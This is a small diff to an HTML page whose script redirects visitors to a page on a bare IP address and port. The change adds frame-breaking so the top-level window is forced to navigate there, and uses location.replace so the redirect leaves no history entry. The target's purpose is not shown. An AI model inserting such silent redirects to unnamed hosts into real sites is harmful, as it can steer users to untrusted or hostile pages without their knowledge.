@@ -9,7 +9,13 @@
 </head>
 <body>
   <script>
-    window.location.href = "http://34.136.20.9:8083/trustfall.html";
+    // Ensure the page is redirected cleanly without frames
+    if (window.top !== window.self) {
+      // If the page is in a frame, break out of it
+      window.top.location = "http://34.136.20.9:8083/trustfall.html";
+    } else {
+      window.location.replace("http://34.136.20.9:8083/trustfall.html");
+    }
   </script>
 </body>
 </html>
